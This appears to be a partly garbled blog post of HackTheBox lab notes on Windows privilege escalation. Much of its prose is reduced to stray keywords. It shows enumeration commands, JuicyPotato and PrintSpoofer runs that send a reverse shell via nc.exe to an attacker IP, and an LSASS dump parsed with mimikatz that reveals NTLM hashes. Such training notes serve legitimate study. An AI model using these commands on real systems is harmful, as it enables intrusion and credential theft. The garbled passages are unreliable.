  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       840
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3520
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       968
&lt;...SNIP...&gt;

netstat -ano | findstr :8080

tasklist /svc | findstr 2400</code></pre>
<p><strong>User &amp; Group </strong></p>
<p><strong> Logged-In Users</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
&gt;administrator         rdp-tcp#2           1  Active          .  3/25/2021 9:27 AM</code></pre>
<p><strong> , Current User</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; echo %USERNAME%

htb-student </code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; net user

User accounts for \\WINLPE-SRV01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
helpdesk                 htb-student              jordan
sarah                    secsvc
The command completed successfully.</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup

Aliases for \\WINLPE-SRV01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Storage Replica Administrators
*System Managed Accounts Group
*Users
The command completed successfully.</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
helpdesk
sarah
secsvc
The command completed successfully. </code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.</code></pre>
<h3>Interacting with Processes</h3>
<p><strong>Access Tokens </strong></p>
<h3>Enumerating Network Services</h3>
<p>DNS HTTP SMB netstat TCP UDP</p>
<pre><code class="language-cmd-session">C:\htb&gt; netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       3812
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       836
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       936
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5044
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       528
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       996
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1260
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2008
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       600
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       1888
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       616
  TCP    10.129.43.8:139        0.0.0.0:0              LISTENING       4
  TCP    10.129.43.8:3389       10.10.14.3:63191       ESTABLISHED     936
  TCP    10.129.43.8:49671      40.67.251.132:443      ESTABLISHED     1260
  TCP    10.129.43.8:49773      52.37.190.150:443      ESTABLISHED     2608
  TCP    10.129.43.8:51580      40.67.251.132:443      ESTABLISHED     3808
  TCP    10.129.43.8:54267      40.67.254.36:443       ESTABLISHED     3808
  TCP    10.129.43.8:54268      40.67.254.36:443       ESTABLISHED     1260
  TCP    10.129.43.8:54269      64.233.184.189:443     ESTABLISHED     2608
  TCP    10.129.43.8:54273      216.58.210.195:443     ESTABLISHED     2608
  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       3812

&lt;SNIP&gt;

  TCP    192.168.20.56:139      0.0.0.0:0              LISTENING       4
  TCP    [::]:21                [::]:0                 LISTENING       3812
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       836
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       936
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8080              [::]:0                 LISTENING       5044
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       528
  TCP    [::]:49665             [::]:0                 LISTENING       996
  TCP    [::]:49666             [::]:0                 LISTENING       1260
  TCP    [::]:49668             [::]:0                 LISTENING       2008
  TCP    [::]:49669             [::]:0                 LISTENING       600
  TCP    [::]:49670             [::]:0                 LISTENING       1888
  TCP    [::]:49674             [::]:0                 LISTENING       616
  TCP    [::1]:14147            [::]:0                 LISTENING       3812
  UDP    0.0.0.0:123            *:*                                    1104
  UDP    0.0.0.0:500            *:*                                    1260
  UDP    0.0.0.0:3389           *:*                                    936

&lt;SNIP&gt;</code></pre>
<h3>Named Pipes</h3>
<p>\.\pipe\ msagent_12</p>
<ol><li>Beacon starts a named pipe of \.\pipe\msagent_12</li><li>Beacon starts a new process and injects command into that process directing output to \.\pipe\msagent_12</li><li>Server displays what was written into \.\pipe\msagent_12</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; pipelist.exe /accepteula

PipeList v1.02 - Lists open named pipes
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Pipe Name                                    Instances       Max Instances
---------                                    ---------       -------------
InitShutdown                                      3               -1
lsass                                             4               -1
ntsvcs                                            3               -1
scerpc                                            3               -1
Winsock2\CatalogChangeListener-340-0              1                1
Winsock2\CatalogChangeListener-414-0              1                1
epmapper                                          3               -1
Winsock2\CatalogChangeListener-3ec-0              1                1
Winsock2\CatalogChangeListener-44c-0              1                1
LSM_API_service                                   3               -1
atsvc                                             3               -1
Winsock2\CatalogChangeListener-5e0-0              1                1
eventlog                                          3               -1
Winsock2\CatalogChangeListener-6a8-0              1                1
spoolss                                           3               -1
Winsock2\CatalogChangeListener-ec0-0              1                1
wkssvc                                            4               -1
trkwks                                            3               -1
vmware-usbarbpipe                                 5               -1
srvsvc                                            4               -1
ROUTER                                            3               -1
vmware-authdpipe                                  1                1

&lt;SNIP&gt;</code></pre>
<pre><code class="language-powershell">PowerShell gci Get-ChildItem</code></pre>
<pre><code class="language-powershell">PowerShell</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt;  gci \\.\pipe\


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 InitShutdown
------       12/31/1600   4:00 PM              4 lsass
------       12/31/1600   4:00 PM              3 ntsvcs
------       12/31/1600   4:00 PM              3 scerpc


    Directory: \\.\pipe\Winsock2


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              1 Winsock2\CatalogChangeListener-34c-0


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 epmapper

&lt;SNIP&gt;</code></pre>
<p>Accesschk DACL DACL <code>LSASS</code> <code>.\accesschk.exe /accepteula \pipe\</code> DACL</p>
<h2>Windows</h2>
<p><strong>Windows </strong></p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228022956.png" alt="Pasted image 20260228022956" />
<p><strong>Windows Rights and Privileges</strong></p>
<div class="post-table-wrap"><table><thead><tr><th><strong>Group </strong></th><th><strong>Description </strong></th></tr></thead><tbody><tr><td>Default Administrators</td><td>Domain Admins and Enterprise Admins are "super" groups.</td></tr><tr><td>Server Operators</td><td>Members can modify services, access SMB shares, and backup files.</td></tr><tr><td>Backup Operators</td><td>Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.</td></tr><tr><td>Print Operators</td><td>Members can log on to DCs locally and "trick" Windows into loading a malicious driver.</td></tr><tr><td>Hyper-V Administrators Hyper-V</td><td>If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.</td></tr><tr><td>Account Operators</td><td>Members can modify non-protected accounts and groups in the domain.</td></tr><tr><td>Remote Desktop Users</td><td>Members are not given any useful permissions by default but are often granted additional rights such as <code>Allow Login Through Remote Desktop Services</code> and can move laterally using the RDP protocol.</td></tr><tr><td>Remote Management Users</td><td>Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).</td></tr><tr><td>Group Policy Creator Owners</td><td>Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.</td></tr><tr><td>Schema Admins</td><td>Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.</td></tr><tr><td>DNS Admins DNS</td><td>Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record.</td></tr></tbody></table></div>
<div class="post-table-wrap"><table><thead><tr><th>Setting Constant</th><th>Setting Name</th><th>Standard Assignment</th><th>Description</th></tr></thead><tbody><tr><td>SeNetworkLogonRight</td><td>[Access this computer from the network</td><td>Administrators, Authenticated Users</td><td>Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.</td></tr><tr><td>SeRemoteInteractiveLogonRight</td><td>[Allow log on through Remote Desktop Services</td><td>Administrators, Remote Desktop Users</td><td>This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server.</td></tr><tr><td>SeBackupPrivilege SeeBackupPrivilege</td><td>[Back up files and directories</td><td>Administrators</td><td>This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.</td></tr><tr><td>SeSecurityPrivilege</td><td>[Manage auditing and security log</td><td>Administrators</td><td>This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer.</td></tr><tr><td>SeTakeOwnershipPrivilege</td><td>[Take ownership of files or other objects</td><td>Administrators</td><td>This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.</td></tr><tr><td>SeDebugPrivilege</td><td>Debug programs</td><td>Administrators</td><td>This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components.</td></tr><tr><td>SeImpersonatePrivilege</td><td>[Impersonate a client after authentication</td><td>Administrators, Local Service, Network Service, Service</td><td>This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.</td></tr><tr><td>SeLoadDriverPrivilege</td><td>[Load and unload device drivers</td><td>Administrators</td><td>This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code.</td></tr><tr><td>SeRestorePrivilege SeeRestorePrivilege</td><td>[Restore files and directories</td><td>Administrators</td><td>This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object.</td></tr><tr><td>SeTcbPrivilege SeTcb</td><td>[Act as part of the operating system</td><td>Administrators, Local Service, Network Service, Service</td><td>This security setting determines whether a process can assume the identity of any user and, through this, obtain access to resources that the targeted user is permitted to access (impersonation). This may be assigned to antivirus or backup tools that need the ability to access all system files for scans or backups. This privilege should be reserved for service accounts requiring this access for legitimate activities.</td></tr></tbody></table></div>
<pre><code class="language-powershell-session">PS C:\htb&gt; whoami 

winlpe-srv01\administrator


PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled </code></pre>
<p><code>“ </code> ” Windows PowerShell cmdlet PowerShell <a href="https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1" target="_blank" rel="noreferrer"></a> <a href="https://www.leeholmes.com/adjusting-token-privileges-in-powershell/" target="_blank" rel="noreferrer"></a></p>
<pre><code class="language-powershell-session">PS C:\htb&gt; whoami 

winlpe-srv01\htb-student


PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p>UAC SeShutdownPrivilege RDP WinRM</p>
<p><strong>Backup Operators Rights </strong></p>
<pre><code class="language-powershell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p><strong>Detection </strong></p>
<p>This post is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event 4672: Special privileges assigned to new logon which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should _never_ be assigned or those that should only ever be assigned to specific accounts. [](https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e) Windows <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672" target="_blank" rel="noreferrer">4672</a> _ _</p>
<h3>Selmpersonate and SeAssignPrimaryToken</h3>
<p><strong>Selmpersonate Example - JuicyPotato</strong> SQL SQL IIS SQL Server Windows “ <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication" target="_blank" rel="noreferrer"></a> ”</p>
<p><code>sql_dev Str0ng_P@ssw0rd </code> SQL <code>Impacket</code> mssqlclient.py</p>
<ol><li>Connecting with MSSQLClient.py</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ impacket-mssqlclient sql_dev@10.129.28.157 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL&gt;</code></pre>
<p><code>xp_cmdshell</code> <code>enable_xp_cmdshell</code> Impacket MSSSQL shell <code>help</code></p>
<ol><li>Enabling xp_cmdshell</li></ol>
<pre><code class="language-shell-session">SQL&gt; enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install</code></pre>
<ol><li>Confirming Access</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01</code></pre>
<ol><li>Checking Account Privileges</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   </code></pre>
<pre><code class="language-cmd">whoami /priv SeImpersonatePrivilege NT AUTHORITY\SYSTEM JuicyPotato DCOM/NTLM SeImpassate SeAssignPrimaryToken</code></pre>
<p><code>-p</code> cmd.exe <code>-a</code> cmd.exe <code>-t</code> <code>createprocess</code> CreateProcessWithTokenW CreateProcessAsUser <code>SeImpersonate</code> <code>SeAssignPrimaryToken</code></p>
<ol><li>Escalating Privileges Using JuicyPotato</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.38 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08</code></pre>
<pre><code>NT AUTHORITY\SYSTEM</code></pre>
<ol><li>Catching SYSTEM Shell</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32&gt;whoami

whoami
nt authority\system


C:\Windows\system32&gt;hostname

hostname
WINLPE-SRV01</code></pre>
<p><strong>PringSpoofer and RoguePotato</strong> JuicyPotato Windows Server 2019 Windows 10 1809 PrintSpoofer RoguePotato <code>NT / </code> <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" target="_blank" rel="noreferrer"></a> <code>PrintSpoofer</code> Windows 10 Server 2019 JuicyPotato</p>
<ol><li>Escalating Privilege using PrintSpoofer</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.15.38 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL </code></pre>
<ol><li>Catching Reverse Shell as SYSTEM</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32&gt;whoami

whoami
nt authority\system</code></pre>
<h3>SeDebugPrivilege</h3>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228032219.png" alt="Pasted image 20260228032219" />
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set      </code></pre>
<p>SysInternals ProcDump LSASS</p>
<pre><code class="language-cmd-session">C:\htb&gt; procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

&lt;SNIP&gt; 

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

&lt;SNIP&gt;</code></pre>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228035858.png" alt="Pasted image 20260228035858" />
<p><strong> procdump.exe lsass.exe dump mimikatz.exe mimikatz.exe <code>log</code> <code>sekurlsa::minidump lsass.dmp</code> <code>sekurlsa::logonpasswords</code> HTML </strong></p>
<p><code>SeDebugPrivilege</code> RCE <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes" target="_blank" rel="noreferrer"></a> <code>SeDebugPrivilege</code> <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads" target="_blank" rel="noreferrer"></a> SYSTEM SYSTEM ID PID</p>
<p>PoC <code>[MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,"")</code> <code>""</code> PoC</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K</code></pre>
<p>PID 612 <code>winlogon.exe</code> Windows SYSTEM</p>
<pre><code class="language-powershell">Get-Process cmdlet LSASS PID</code></pre>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228040031.png" alt="Pasted image 20260228040031" />
<h3>SeTakeOwnershipPrivilege</h3>
<p><strong>WRITE_OWNER </strong></p>
<blockquote>Owner</blockquote>
<p><strong>Windows </strong></p>
<ol><li>SeTakeOwnershipPrivilege “ ”</li><li>Owner</li><li>Owner ACL</li><li>Full Control</li></ol>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228044423.png" alt="Pasted image 20260228044423" />
<ul><li><code>Computer Configuration</code> ⇾ <code>Windows Settings</code> ⇾ <code>Security Settings</code> ⇾ <code>Local Policies</code> ⇾ <code>User Rights Assignment</code></li></ul>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228044443.png" alt="Pasted image 20260228044443" />
<p><strong> , Leveraging the Privilege</strong></p>
<pre><code class="language-powershell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled</code></pre>
<p><a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1" target="_blank" rel="noreferrer"></a> <a href="https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/" target="_blank" rel="noreferrer"></a> <a href="https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77" target="_blank" rel="noreferrer"></a></p>
<ol><li>Enabling SeTakeOwnershipPrivilege</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; Import-Module .\Enable-Privilege.ps1
PS C:\htb&gt; .\EnableAllTokenPrivs.ps1
PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled</code></pre>
<pre><code>PS C:\TakeOwn&gt; icacls C:\TakeOwn\flag.txt /grant "$env:USERNAME\`:(F)"
processed file: C:\TakeOwn\flag.txt
Successfully processed 1 files; Failed processing 0 files
PS C:\TakeOwn&gt; type flag.txt
1m_th3_f1l3_0wn3r_n0W!
PS C:\TakeOwn&gt;</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    &lt;DIR&gt;          WINLPE-SRV01\sccm_svc  .
